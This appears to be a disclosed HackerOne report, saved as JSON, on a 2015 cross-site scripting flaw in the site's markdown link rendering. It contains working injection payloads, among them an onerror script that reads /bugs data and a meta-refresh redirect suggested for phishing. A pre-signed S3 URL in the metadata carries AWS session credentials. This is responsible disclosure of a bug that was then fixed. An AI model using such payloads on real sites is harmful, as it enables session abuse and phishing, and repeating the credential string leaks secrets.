{"id":46072,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NjA3Mg==","url":"https://hackerone.com/reports/46072","title":"Vulnerability with the way \\ escaped characters in \u003chttp://danlec.com\u003e style links are rendered","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2015-02-01T23:52:18.498Z","submitted_at":"2015-02-01T23:52:18.498Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"danlec","url":"/danlec","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13,"url":"https://hackerone.com/security","handle":"security","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"HackerOne","twitter_handle":"Hacker0x01","website":"https://hackerone.com","about":"Vulnerability disclosure should be safe, transparent, and rewarding."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2015-02-03T17:34:45.891Z","bug_reporter_agreed_on_going_public_at":"2015-02-03T17:34:45.035Z","team_member_agreed_on_going_public_at":"2015-02-02T19:07:05.856Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"\u003e \u003chttp://\\\u003cdiv\\ style=\\\"font-size:24px;background:red;color:white;width:100%;height:48px;line-height:48px;text-align:center;\\\"\\\u003eUh\\ oh!\u003c/div\\\u003e\u003e\r\n\r\n## Basic POC:\r\n\r\nSequences like `\u003chttp://\\\u003ch1\\\u003etest\\\u003c/h1\\\u003e\u003e` are rendered as `http://\u003ch1\u003etest\u003c/h1\u003e`\r\n\r\n## Examples of what could be done with this:\r\n\r\nObviously there's a whole variety of stuff that can be done when you can inject arbitrary HTML, even in spite of the CSP protection.\r\n\r\nWe can put in elements we're not supposed to (see above, where we've inserted an attention grabbing `div`)\r\n\r\nWe can put in \"arbitrary\" images (i.e. profile pictures)\r\n\r\n```\r\n\u003chttp://\\\u003cimg\\ src=\\\"https://profile-photos.hackerone-user-content.com/production/000/000/013/76b3a9e70495c3b7340e33cdf5141660ae26489b_large.png?1383694562\\\"\\\u003e\r\n```\r\n\r\n\u003e \u003chttp://\\\u003cimg\\ src=\\\"https://profile-photos.hackerone-user-content.com/production/000/000/013/76b3a9e70495c3b7340e33cdf5141660ae26489b_large.png?1383694562\\\"\\\u003e\u003e\r\n\r\nWe can put in our own `\u003cstyle\u003e` tags, e.g. using\r\n\r\n```\r\n\u003chttp://\\\u003cstyle\\\u003e.markdownable\\ blockquote{color:white;border:0;padding:0;margin:0;}a{color:red !important}\\\u003c/style\\\u003e\u003e\r\n```\r\n\r\n\u003e \u003chttp://\\\u003cstyle\\\u003e.markdownable\\ blockquote{color:white;border:0;padding:0;margin:0;}a{color:red\\ !important}\\\u003c/style\\\u003e\u003e\r\n\r\n## Serious Exploits\r\n\r\nWe can bypass HackerOne's link /redirect:\r\n\r\n```\r\n\u003chttp://\\\u003ca\\ href=\\\"http://danlec.com\\\"\\\u003eRedirect\\ bypassed\\\u003c/a\\\u003e\u003e\r\n```\r\n\r\nIf we wanted to be particularly sneaky, we could use CSS to make a link cover the whole submission, so clicking anywhere would activate the link … which might allow us to do some phishing by having the link go to a fake HackerOne login screen.\r\n\r\n\u003e \u003chttp://\\\u003ca\\ href=\\\"http://danlec.com\\\"\\\u003eRedirect\\ bypassed\\\u003c/a\\\u003e\u003e\r\n\r\nFor browsers without good CSP support, like IE11, we can use this to run script on a victim when they try to view our submission using\r\n\r\n```\r\n\u003chttp://\\\u003cimg\\ style=\\\"display:none\\\"\\ src=0\\ onerror=\\\"alert(\\'Uh\\ oh\\')\\\"\\\u003e\u003e\r\n```\r\n\r\n\u003e \u003chttp://\\\u003cimg\\ style=\\\"display:none\\\"\\ src=0\\ onerror=\\\"alert(\\'Uh\\ oh\\')\\\"\\\u003e\u003e\r\n\r\n(If you're using IE11 for some reason, you'll get an alert when you view this submission)\r\n","bounty_amount":"5000.0","formatted_bounty":"$5,000","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2015-03-04T19:07:06.642Z","allow_singular_disclosure_after":-208468517.79958373,"singular_disclosure_allowed":true,"vote_count":16,"voters":["zzero","dirk","sw33tlie","inhibitor181","spam404","ali","karel_origin","xsam","r3y","khizer47","and 6 more..."],"severity":{"rating":"high","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":322415,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I've verified that something like the following works in submissions viewed in IE11, and would have the possibility of giving unauthorized access to other bug descriptions\n\n```\n\u003chttp://\\\u003cimg\\ src=0\\ onerror=\\\"$.getJSON(\\'/bugs\\',function(a){alert(JSON.stringify(a));})\\\"\\\u003e\u003e\n```\n\nI expect you could also include these things in bug reports that are then made public, allowing you to potentially get unauthorized access to data from researchers.\n\n","automated_response":false,"created_at":"2015-02-02T00:06:07.442Z","updated_at":"2015-02-02T00:06:07.442Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":322517,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It also appears that this same attack works in the markdown for program descriptions, and in both cases (descriptions and bug reports) you could use something like\n\n```\n\u003chttp://\\\u003cmeta\\ http-equiv=\\\"refresh\\\"\\ content=\\\"0;\\ url=http://danlec.com/\\\"\\\u003e\u003e\n```\n\nto cause the page to redirect immediately when loaded… which could also be used in a phishing scheme.","automated_response":false,"created_at":"2015-02-02T08:33:27.553Z","updated_at":"2015-02-02T08:33:27.553Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":322562,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hey @danlec,\n\nThank you for your report, we were able to reproduce this (nice PoC by the way), and we are looking into this issue. \n","automated_response":false,"created_at":"2015-02-02T10:11:57.985Z","updated_at":"2015-02-02T10:11:57.985Z","actor":{"username":"dirk","cleared":false,"url":"/dirk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/067/f9785240873663ec965b04e725871ed0f69616e7_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":322603,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"\u003e http://\u003cdiv style=\"font-size:24px;background:red;color:white;width:100%;height:48px;line-height:48px;text-align:center;\"\u003eFixed\u003c/div\u003e\n\nHey @danlec,\n\nWe've deployed a fix, and as you can see the bug has been squashed. Could you check if you agree?","automated_response":false,"created_at":"2015-02-02T12:12:02.774Z","updated_at":"2015-02-02T12:12:02.774Z","actor":{"username":"dirk","cleared":false,"url":"/dirk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/067/f9785240873663ec965b04e725871ed0f69616e7_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"danlec","url":"/danlec"},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":322608,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey dirk!  Yes, as far as I can tell this issue has been resolved.  Thanks for the quick response :)","automated_response":false,"created_at":"2015-02-02T12:17:42.588Z","updated_at":"2015-02-02T12:17:42.588Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":322813,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"HackerOne's first XSS! Even though this only leads to a direct same origin violation in clients that do not support a `Content-Security-Policy`, this was a wonderful find. It is the first report to reach our **[Severe](https://hackerone.com/security)** categorization. Thanks @danlec!","automated_response":false,"created_at":"2015-02-02T19:06:58.923Z","updated_at":"2015-02-02T19:06:58.923Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"HackerOne"}},"bounty_amount":"5000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"security","collaborator":{"username":"danlec","url":"/danlec"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":322814,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2015-02-02T19:07:05.906Z","updated_at":"2015-02-02T19:07:05.906Z","first_to_agree":true,"actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":323493,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"For those seeing this report after the fix has been deployed, attached is a screenshot of this report before we resolved the issue, clearly showing the proof of concept in action.","automated_response":false,"created_at":"2015-02-03T12:17:31.298Z","updated_at":"2015-02-03T12:17:31.298Z","actor":{"username":"dirk","cleared":false,"url":"/dirk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/067/f9785240873663ec965b04e725871ed0f69616e7_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"attachments":[{"id":28409,"filename":"screen_shot_2015-02-02_at_10.58.31_(2).png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/028/409/690f0ec0dc5a31fbaa796b4ee0d924dfa20b4c7e/screen_shot_2015-02-02_at_10.58.31_%282%29.png?response-content-disposition=attachment%3B%20filename%3D%22screen_shot_2015-02-02_at_10.58.31_%25282%2529.png%22%3B%20filename%2A%3DUTF-8%27%27screen_shot_2015-02-02_at_10.58.31_%25282%2529.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQX46P3UGI%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150224Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIGvlFSN4tPhAu4V7v5pc7%2F6eSiik7IhHLLD01kiqhVWYAiB5Dz9ea%2BLZD%2BpLtagj4O%2BjrW%2FPBVXyOw%2FvfPhYOWnLJyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMy2N4EHiSo%2FA9G2F0KtcDeo3CuylmH%2BuFka3rGPAArFX7PEojyq8EAAWPijF4XtZGXNXpmeQR1pzTOcI0Rm%2Fvja%2BwHd%2F8TxJsGVWeh%2Flk5vjiIRZT9GPW9u3ZycCrjqMci9iGhBM6uwkYQOmABA3poTj0CyTV9vU5PwMEPHFcEacwKutRiCveofJe7f8Tu4WHR%2BNU7KEmxqtXpvAXj8hQLxFVDU25WgaPgk2b4mSQSaY%2FPywLP4TuBkCMbSNVoBG2JTX5CaBeJN5iElkzZ62K%2FGVGXrbaaNyPhn%2BB8rXIjbw78eQJEkHjvT8OqfCHAYP5f%2B4IhYfTll35nE7LIUoMiLvBq6tkN5BWqoopu%2Fpju60lSqB656qlcZeAK9f5orDqJzDwlKMnoVzqvkUrUy9bmk%2BkxGW97VVmeHZ1t0v3wof%2BrT0QSrWeBO35JesCQ%2BdFE8O%2BxosSdP7tU4A%2BDPpxwomZQHAAcNR9Aywt%2FQ8Qbv894mkGzt9WDwY%2FFN8jeU3O6C%2BmyqjrgMf7nGycFeD87%2Bsgs8CikLj6%2BhBYFpskae2EppYXvqHFDwWaJKFLdI8X3NNsrRpCnIXL5GUe8p%2BBySjVvE4SnyaxoJD5sUMGcJj0QQyQGgO22eUI1ATV1DsO%2BN%2BaLLxtMPqIkYsGOqYBTa91vvmG%2BK28LWqLSYG8vhMxYQ%2Fxj6PD70iq5MyM9pLPu1bgCyqJfX2mwm9fHA6UDqgGoerI%2Bnp3Q6V4OYY0E3hEAx7T8Q%2FppO8G%2BTgH7gaNlLC%2Fng4%2BkFoIuXyVGb7q1PCueRn4pqAqwTocflxXYcQQGudKiKkzrNHGy4UeULO76lDgSIcMEtI1vIJ76b2MxFEJwq4lWhln09Xn3ksb8maUXRDeCg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=8c61e184629665889dff9ea5b7ece788cf6ecc21601b53928652544be382cfa4"}],"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":323628,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks for the bounty, the kind words, and for running a great service!  \n\nI've written a bit about this issue at http://danlec.com/blog/hackerones-first-xss","automated_response":false,"created_at":"2015-02-03T17:34:45.075Z","updated_at":"2015-02-03T17:34:45.075Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":323629,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2015-02-03T17:34:46.074Z","updated_at":"2015-02-03T17:34:46.074Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1248053,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2016-10-14T18:16:19.245Z","updated_at":"2016-10-14T18:16:19.245Z","additional_data":{"old_severity":null,"new_severity":"High","old_severity_id":null,"new_severity_id":2202},"actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}